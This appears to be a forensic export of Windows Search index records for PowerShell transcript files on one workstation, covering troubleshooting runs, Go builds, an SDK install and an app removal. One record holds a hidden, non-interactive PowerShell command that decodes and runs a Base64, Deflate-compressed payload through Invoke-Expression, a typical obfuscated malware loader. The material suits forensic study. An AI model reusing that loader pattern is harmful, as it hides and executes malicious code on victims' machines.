0F-InvertedOnlyMD5,0-InvertedOnlyPids,11-System_FileName,13F-System_Size,14F-System_FileAttributes,15F-System_DateModified,16F-System_DateCreated,17F-System_DateAccessed,33-System_ItemUrl,3-System_ItemFolderNameDisplay,4165-System_ComputerName,4334-System_ContentType,4346-System_DateImported,4352-System_Document_DateCreated,4354-System_Document_DateSaved,4373-System_FileExtension,4377-System_FileOwner,4378-System_FilePlaceholderStatus,4410-System_IsAttachment,4412-System_IsEncrypted,4415-System_IsFolder,4419-System_ItemDate,4421-System_ItemFolderPathDisplay,4422-System_ItemFolderPathDisplayNarrow,4423-System_ItemName,4424-System_ItemNameDisplay,4425-System_ItemNameDisplayWithoutExtension,4428-System_ItemPathDisplay,4429-System_ItemPathDisplayNarrow,4431-System_ItemType,4437-System_Kind,4438-System_KindText,4453-System_MIMEType,4540-System_NotUserContent,4546-System_ParsingName,4604-System_SFGAOFlags,4605-System_Search_AccessCount,4606-System_Search_AutoSummary,4612F-System_Search_GatherTime,4614-System_Search_LastIndexedTotalTime,4618-System_Search_Store,4655-System_ThumbnailCacheId,4679-System_VolumeId,5-System_ItemTypeText,WorkID
"E2B06E8DB61C3D0692B5CA75FD25AA3E","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.Wb6OXvg9.20180410173852.txt","3492","Archive (32)","10/04/2018 23:38:54.0871162","10/04/2018 23:38:52.2119404","10/04/2018 23:38:52.2119404","file:C:/Users/maxpowers/Documents/20180410/PowerShell_transcript.DESKTOP-EDSLQM8.Wb6OXvg9.20180410173852.txt","20180410","DESKTOP-EDSLQM8","text/plain","10/04/2018 23:38:54.0000000","10/04/2018 23:38:54.0000000","10/04/2018 23:38:54.0871162",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","10/04/2018 23:38:54.0871162","C:\Users\maxpowers\Documents\20180410","20180410 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.Wb6OXvg9.20180410173852.txt","PowerShell_transcript.DESKTOP-EDSLQM8.Wb6OXvg9.20180410173852.txt","PowerShell_transcript.DESKTOP-EDSLQM8.Wb6OXvg9.20180410173852","C:\Users\maxpowers\Documents\20180410\PowerShell_transcript.DESKTOP-EDSLQM8.Wb6OXvg9.20180410173852.txt","PowerShell_transcript.DESKTOP-EDSLQM8.Wb6OXvg9.20180410173852 (C:\Users\maxpowers\Documents\20180410)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.Wb6OXvg9.20180410173852.txt","1077936503","0","**********************
Windows PowerShell transcript start
Start time: 20180410173852
Username: DESKTOP-EDSLQM8\maxpowers
RunAs User: DESKTOP-EDSLQM8\maxpowers
Configuration Name: 
Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
Host Application: C:\WINDOWS\System32\sdiagnhost.exe -Embedding
Process ID: 1936
PSVersion: 5.1.16299.251
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
BuildVersion: 10.0.16299.251
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
PS>CommandInvocation(Set-Location): ""Set-Location""
>> ParameterBinding(Set-Location): name=""Path""; value=""C:\WINDOWS\TEMP\SDIAG_dc0d1113-0a1f-410a-ba34-35c2c813954a""
PS>& ""C:\WINDOWS\TEMP\SDIAG_dc0d1113-0a1f-410a-ba34-35c2c813954a\TS_WERQueue.ps1""
**********************
Windows PowerShell transcript start
Start time: 20180410173852
Username: DESKTOP-EDSLQM8\maxpowers
RunAs User: DESKTOP-EDSLQM8\maxpowers","10/04/2018 23:38:54.1649146","0","file","36A6901A2A77669E","804cb650-0000-0000-0000-501f00000000","Text Document","2434"
"13D44A0878BF291BC83A73B61FE8CE99","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.rv2uZUBM.20180409104540.txt","1100","Archive (32)","09/04/2018 16:45:41.3625987","09/04/2018 16:45:41.1435351","09/04/2018 16:45:41.1435351","file:C:/Users/maxpowers/Documents/20180409/PowerShell_transcript.DESKTOP-EDSLQM8.rv2uZUBM.20180409104540.txt","20180409","DESKTOP-EDSLQM8","text/plain","09/04/2018 16:45:41.3625987","09/04/2018 16:45:41.3625987","09/04/2018 16:45:41.3625987",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","09/04/2018 16:45:41.3625987","C:\Users\maxpowers\Documents\20180409","20180409 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.rv2uZUBM.20180409104540.txt","PowerShell_transcript.DESKTOP-EDSLQM8.rv2uZUBM.20180409104540.txt","PowerShell_transcript.DESKTOP-EDSLQM8.rv2uZUBM.20180409104540","C:\Users\maxpowers\Documents\20180409\PowerShell_transcript.DESKTOP-EDSLQM8.rv2uZUBM.20180409104540.txt","PowerShell_transcript.DESKTOP-EDSLQM8.rv2uZUBM.20180409104540 (C:\Users\maxpowers\Documents\20180409)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.rv2uZUBM.20180409104540.txt","1077936503","0","**********************
Windows PowerShell transcript start
Start time: 20180409104541
Username: DESKTOP-EDSLQM8\maxpowers
RunAs User: DESKTOP-EDSLQM8\maxpowers
Configuration Name: 
Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
Host Application: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -noprofile -ExecutionPolicy RemoteSigned -command [Console]::OutputEncoding=[System.Text.Encoding]::UTF8
$output=[environment]::GetEnvironmentVariable('Path','User')
[Console]::WriteLine($output)
Process ID: 7684
PSVersion: 5.1.16299.251
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
BuildVersion: 10.0.16299.251
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
PS>[Console]::OutputEncoding=[System.Text.Encoding]::UTF8
$output=[environment]::GetEnvironmentVariable('Path','User')
[Console]::WriteLine($output)
PS>$global:?
True
**********************
Windows Powe","09/04/2018 16:45:43.8628058","0","file","C931CF2A8DC6BC88",,"Text Document","2435"
"EA1DDE466FFBF738880DE4688039419B","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.zekZRqZU.20180409112917.txt","701","Archive (32)","09/04/2018 17:29:37.9092986","09/04/2018 17:29:18.0096804","09/04/2018 17:29:18.0096804","file:C:/Users/maxpowers/Documents/20180409/PowerShell_transcript.DESKTOP-EDSLQM8.zekZRqZU.20180409112917.txt","20180409","DESKTOP-EDSLQM8","text/plain","09/04/2018 17:29:20.0000000","09/04/2018 17:29:20.0000000","09/04/2018 17:29:37.9092986",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","09/04/2018 17:29:37.9092986","C:\Users\maxpowers\Documents\20180409","20180409 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.zekZRqZU.20180409112917.txt","PowerShell_transcript.DESKTOP-EDSLQM8.zekZRqZU.20180409112917.txt","PowerShell_transcript.DESKTOP-EDSLQM8.zekZRqZU.20180409112917","C:\Users\maxpowers\Documents\20180409\PowerShell_transcript.DESKTOP-EDSLQM8.zekZRqZU.20180409112917.txt","PowerShell_transcript.DESKTOP-EDSLQM8.zekZRqZU.20180409112917 (C:\Users\maxpowers\Documents\20180409)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.zekZRqZU.20180409112917.txt","1077936503","0","**********************
Windows PowerShell transcript start
Start time: 20180409112918
Username: DESKTOP-EDSLQM8\maxpowers
RunAs User: DESKTOP-EDSLQM8\maxpowers
Configuration Name: 
Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
Host Application: PowerShell.exe -noexit -command Set-Location -literalPath 'C:\Projects\ProjectC'
Process ID: 6692
PSVersion: 5.1.16299.251
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
BuildVersion: 10.0.16299.251
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
PS>Set-Location -literalPath 'C:\Projects\ProjectC'
","09/04/2018 17:29:38.1854410","0,046875","file","BBEE392DC2195BFF","804cb650-0000-0000-0000-501f00000000","Text Document","2436"
"235BD1DC2244A068FE416F00692E9ACA","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.20avRYrR.20180426095058.txt","3709","Archive (32)","26/04/2018 15:52:10.0836008","26/04/2018 15:50:58.2866920","26/04/2018 15:50:58.2866920","file:C:/Users/maxpowers/Documents/20180426/PowerShell_transcript.DESKTOP-EDSLQM8.20avRYrR.20180426095058.txt","20180426","DESKTOP-EDSLQM8","text/plain","26/04/2018 15:51:00.0000000","26/04/2018 15:51:00.0000000","26/04/2018 15:52:10.0836008",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","26/04/2018 15:52:10.0836008","C:\Users\maxpowers\Documents\20180426","20180426 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.20avRYrR.20180426095058.txt","PowerShell_transcript.DESKTOP-EDSLQM8.20avRYrR.20180426095058.txt","PowerShell_transcript.DESKTOP-EDSLQM8.20avRYrR.20180426095058","C:\Users\maxpowers\Documents\20180426\PowerShell_transcript.DESKTOP-EDSLQM8.20avRYrR.20180426095058.txt","PowerShell_transcript.DESKTOP-EDSLQM8.20avRYrR.20180426095058 (C:\Users\maxpowers\Documents\20180426)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.20avRYrR.20180426095058.txt","1077936503","0","**********************
Windows PowerShell transcript start
Start time: 20180426095058
Username: DESKTOP-EDSLQM8\maxpowers
RunAs User: DESKTOP-EDSLQM8\maxpowers
Configuration Name: 
Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
Host Application: C:\Windows\syswow64\windowspowershell\v1.0\powershell.exe -NoP -NonI -W Hidden -Command Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String("" pVZNj9s2EL37VxCGDjbWWlAS9eEYCyRtUCBAkQbdbXswfKAoqiuUlgSJzno37X8vZyRS1joBivQy5HCGb97MUKQ8Qe7I2+Vi/16pD8e26fRq+Zfsaqmi8LZQark+kPaUq0qQXnNtBnnWxk4+1PqT7sjvVadPXL1TqhGrce1pQ05Vrcl5HJ/H8WW9++44P3aSa/nwaIbCxjmNuJ83ZIo8zi5ijyuvox/7z6LT/yX2UR57qVfXyN+fVd40ytbuU9doKRy+at8VRSf7fsQvnu6rFzkqpfoon8YNG9Kc9LCs2lL9oorRYAgt3y68xnTWQPkPz60kvkkil917WVZ1paumJp4g/kd+lGT5R1VH4ZL4tdH6lgtJcOWnUy3Asyd+y/teP3anhXe+85o3b2Zdpxt6DiiFIRoGytY7sv/hWcv94eD1cMTouRTGIjMjshB86EwkILItuMQAFBgh0MDAkBsRDxGciihipgbOOQU1hGi0NCJPjWAc1hILX4KBA0AEIoG1FGY","26/04/2018 15:52:10.5366975","0,046875","file","145541B3E559609C","804cb650-0000-0000-0000-501f00000000","Text Document","2437"
"5B44FBE2F1E4FCC563B4B60DFE430DF1","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.yzRhEPIk.20180409115511.txt","1171","Archive (32)","09/04/2018 17:55:21.0341751","09/04/2018 17:55:11.8935983","09/04/2018 17:55:11.8935983","file:C:/Users/maxpowers/Documents/20180409/PowerShell_transcript.DESKTOP-EDSLQM8.yzRhEPIk.20180409115511.txt","20180409","DESKTOP-EDSLQM8","text/plain","09/04/2018 17:55:12.0000000","09/04/2018 17:55:12.0000000","09/04/2018 17:55:21.0341751",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","09/04/2018 17:55:21.0341751","C:\Users\maxpowers\Documents\20180409","20180409 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.yzRhEPIk.20180409115511.txt","PowerShell_transcript.DESKTOP-EDSLQM8.yzRhEPIk.20180409115511.txt","PowerShell_transcript.DESKTOP-EDSLQM8.yzRhEPIk.20180409115511","C:\Users\maxpowers\Documents\20180409\PowerShell_transcript.DESKTOP-EDSLQM8.yzRhEPIk.20180409115511.txt","PowerShell_transcript.DESKTOP-EDSLQM8.yzRhEPIk.20180409115511 (C:\Users\maxpowers\Documents\20180409)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.yzRhEPIk.20180409115511.txt","1077936503","0","**********************
Windows PowerShell transcript start
Start time: 20180409115511
Username: DESKTOP-EDSLQM8\maxpowers
RunAs User: DESKTOP-EDSLQM8\maxpowers
Configuration Name: 
Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
Host Application: PowerShell.exe -noexit -command Set-Location -literalPath 'C:\Projects\ProjectC'
Process ID: 7308
PSVersion: 5.1.16299.251
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
BuildVersion: 10.0.16299.251
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
PS>Set-Location -literalPath 'C:\Projects\ProjectC'
PS C:\Projects\ProjectC> python .\c_test.py
{
    ""RecordLength"": 96,
    ""MajorVersion"": 2,
    ""MinorVersion"": 0,
    ""FileReferenceNumber"": 10477624533077459059,
    ""ParentFileReferenceNumber"": 1970324837116475,
    ""Usn"": 20342374400,
    ""TimeStamp"": 130266586132760403,
    ""Reason"": 2,
    ""SourceInfo"": 0,
","09/04/2018 17:55:24.5969072","0,046875","file","CFEACF0ADA1B73EF","804cb650-0000-0000-0000-501f00000000","Text Document","2438"
"B483B7E08757177FBB492D906A2C0E26","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.I2cSTzZ0.20180409120219.txt","701","Archive (32)","09/04/2018 18:02:19.4837614","09/04/2018 18:02:19.1713483","09/04/2018 18:02:19.1713483","file:C:/Users/maxpowers/Documents/20180409/PowerShell_transcript.DESKTOP-EDSLQM8.I2cSTzZ0.20180409120219.txt","20180409","DESKTOP-EDSLQM8","text/plain","09/04/2018 18:02:19.4837614","09/04/2018 18:02:19.4837614","09/04/2018 18:02:19.4837614",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","09/04/2018 18:02:19.4837614","C:\Users\maxpowers\Documents\20180409","20180409 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.I2cSTzZ0.20180409120219.txt","PowerShell_transcript.DESKTOP-EDSLQM8.I2cSTzZ0.20180409120219.txt","PowerShell_transcript.DESKTOP-EDSLQM8.I2cSTzZ0.20180409120219","C:\Users\maxpowers\Documents\20180409\PowerShell_transcript.DESKTOP-EDSLQM8.I2cSTzZ0.20180409120219.txt","PowerShell_transcript.DESKTOP-EDSLQM8.I2cSTzZ0.20180409120219 (C:\Users\maxpowers\Documents\20180409)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.I2cSTzZ0.20180409120219.txt","1077936503","0","**********************
Windows PowerShell transcript start
Start time: 20180409120219
Username: DESKTOP-EDSLQM8\maxpowers
RunAs User: DESKTOP-EDSLQM8\maxpowers
Configuration Name: 
Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
Host Application: PowerShell.exe -noexit -command Set-Location -literalPath 'C:\Projects\ProjectC'
Process ID: 3128
PSVersion: 5.1.16299.251
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
BuildVersion: 10.0.16299.251
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
PS>Set-Location -literalPath 'C:\Projects\ProjectC'
","09/04/2018 18:02:25.3432268","0,03125","file","22B3CBF0E27513B7","804cb650-0000-0000-0000-501f00000000","Text Document","2439"
"E3E9CAF4C914A2CE76039826E842FA89","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.iHM30LIe.20180411092543.txt","1658","Archive (32)","11/04/2018 15:27:57.6174951","11/04/2018 15:25:43.9620509","11/04/2018 15:25:43.9620509","file:C:/Users/maxpowers/Documents/20180411/PowerShell_transcript.DESKTOP-EDSLQM8.iHM30LIe.20180411092543.txt","20180411","DESKTOP-EDSLQM8","text/plain","11/04/2018 15:25:44.0000000","11/04/2018 15:25:44.0000000","11/04/2018 15:27:57.6174951",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","11/04/2018 15:27:57.6174951","C:\Users\maxpowers\Documents\20180411","20180411 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.iHM30LIe.20180411092543.txt","PowerShell_transcript.DESKTOP-EDSLQM8.iHM30LIe.20180411092543.txt","PowerShell_transcript.DESKTOP-EDSLQM8.iHM30LIe.20180411092543","C:\Users\maxpowers\Documents\20180411\PowerShell_transcript.DESKTOP-EDSLQM8.iHM30LIe.20180411092543.txt","PowerShell_transcript.DESKTOP-EDSLQM8.iHM30LIe.20180411092543 (C:\Users\maxpowers\Documents\20180411)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.iHM30LIe.20180411092543.txt","1077936503","0","**********************
Windows PowerShell transcript start
Start time: 20180411092543
Username: DESKTOP-EDSLQM8\maxpowers
RunAs User: DESKTOP-EDSLQM8\maxpowers
Configuration Name: 
Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
Host Application: PowerShell.exe -noexit -command Set-Location -literalPath 'C:\Users\maxpowers\Documents\stuff'
Process ID: 6936
PSVersion: 5.1.16299.251
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
BuildVersion: 10.0.16299.251
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
PS>Set-Location -literalPath 'C:\Users\maxpowers\Documents\stuff'
PS C:\Users\maxpowers\Documents\stuff> go build

PS C:\Users\maxpowers\Documents\stuff> go build .\tg.go

PS C:\Users\maxpowers\Documents\stuff> .\tg.exe
hello, world
PS C:\Users\maxpowers\Documents\stuff> .\tg.exe
hello, world
PS C:\Users\maxpowers\Documents\stuff> .\tg.exe
hello, world","11/04/2018 15:28:02.5705864","0,03125","file","6A796D605293CE8E","804cb650-0000-0000-0000-501f00000000","Text Document","2451"
"44CA455EB5E5A0677F14E3A8D941729D","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.c4Lp9zwb.20180411093811.txt","3048","Archive (32)","11/04/2018 15:42:55.2738067","11/04/2018 15:38:12.3206043","11/04/2018 15:38:12.3206043","file:C:/Users/maxpowers/Documents/20180411/PowerShell_transcript.DESKTOP-EDSLQM8.c4Lp9zwb.20180411093811.txt","20180411","DESKTOP-EDSLQM8","text/plain","11/04/2018 15:38:14.0000000","11/04/2018 15:38:14.0000000","11/04/2018 15:42:55.2738067",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","11/04/2018 15:42:55.2738067","C:\Users\maxpowers\Documents\20180411","20180411 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.c4Lp9zwb.20180411093811.txt","PowerShell_transcript.DESKTOP-EDSLQM8.c4Lp9zwb.20180411093811.txt","PowerShell_transcript.DESKTOP-EDSLQM8.c4Lp9zwb.20180411093811","C:\Users\maxpowers\Documents\20180411\PowerShell_transcript.DESKTOP-EDSLQM8.c4Lp9zwb.20180411093811.txt","PowerShell_transcript.DESKTOP-EDSLQM8.c4Lp9zwb.20180411093811 (C:\Users\maxpowers\Documents\20180411)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.c4Lp9zwb.20180411093811.txt","1077936503","0","**********************
Windows PowerShell transcript start
Start time: 20180411093812
Username: DESKTOP-EDSLQM8\maxpowers
RunAs User: DESKTOP-EDSLQM8\maxpowers
Configuration Name: 
Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
Host Application: c:\windows\syswow64\\windowspowershell\v1.0\powershell.exe -NonInteractive -NoLogo -NoProfile -ExecutionPolicy Bypass -InputFormat None $ErrorActionPreference=""Stop""; $VerbosePreference=""Continue""; $CeipSetting=""on""; $ScriptPath=""C:\ProgramData\Microsoft\VisualStudio\Packages\Win10SDK_10.0.16299,version=10.0.16299.2\WinSdkInstall.ps1""; $SetupExe=""winsdksetup.exe""; $SetupLogFolder=""windowssdk""; $PackageId=""Win10SDK_10.0.16299""; $LogFile=""C:\Users\maxpowers\AppData\Local\Temp\dd_setup_20180411093437_079_Win10SDK_10.0.16299.log""; $SetupParameters=""/features OptionId.AvrfExternal OptionId.UWPManaged OptionId.WindowsSoftwareLogoToolkit OptionId.SigningTools OptionId.UWPLocalized OptionId.UWPCPP OptionId.DesktopCPPx64 OptionId.DesktopCPPx86 OptionID.Des","11/04/2018 15:42:56.1594176","0,0625","file","4B265C12C52CE61C","804cb650-0000-0000-0000-501f00000000","Text Document","2489"
"561E3BF02BF80FF5DD6AE979594A76EE","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.tton8k9I.20180426123242.txt","868","Archive (32)","26/04/2018 18:32:43.5952724","26/04/2018 18:32:42.3352156","26/04/2018 18:32:42.3352156","file:C:/Users/itsupport/Documents/20180426/PowerShell_transcript.DESKTOP-EDSLQM8.tton8k9I.20180426123242.txt","20180426","DESKTOP-EDSLQM8","text/plain","26/04/2018 18:32:43.5952724","26/04/2018 18:32:43.5952724","26/04/2018 18:32:43.5952724",".txt","DESKTOP-EDSLQM8\itsupport","6","False","False","False","26/04/2018 18:32:43.5952724","C:\Users\itsupport\Documents\20180426","20180426 (C:\Users\itsupport\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.tton8k9I.20180426123242.txt","PowerShell_transcript.DESKTOP-EDSLQM8.tton8k9I.20180426123242.txt","PowerShell_transcript.DESKTOP-EDSLQM8.tton8k9I.20180426123242","C:\Users\itsupport\Documents\20180426\PowerShell_transcript.DESKTOP-EDSLQM8.tton8k9I.20180426123242.txt","PowerShell_transcript.DESKTOP-EDSLQM8.tton8k9I.20180426123242 (C:\Users\itsupport\Documents\20180426)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.tton8k9I.20180426123242.txt","1077936503","0","**********************
Windows PowerShell transcript start
Start time: 20180426123242
Username: DESKTOP-EDSLQM8\itsupport
RunAs User: DESKTOP-EDSLQM8\itsupport
Configuration Name: 
Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
Host Application: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell Get-AppxPackage C27EB4BA.DropboxOEM | Remove-AppxPackage
Process ID: 7844
PSVersion: 5.1.16299.251
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
BuildVersion: 10.0.16299.251
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
PS>Get-AppxPackage C27EB4BA.DropboxOEM | Remove-AppxPackage
PS>$global:?
True
**********************
Windows PowerShell transcript end
End time: 20180426123243
**********************
","26/04/2018 18:32:44.3640053","0","file","E8C304CA99A5E40B","804cb650-0000-0000-0000-501f00000000","Text Document","2911"
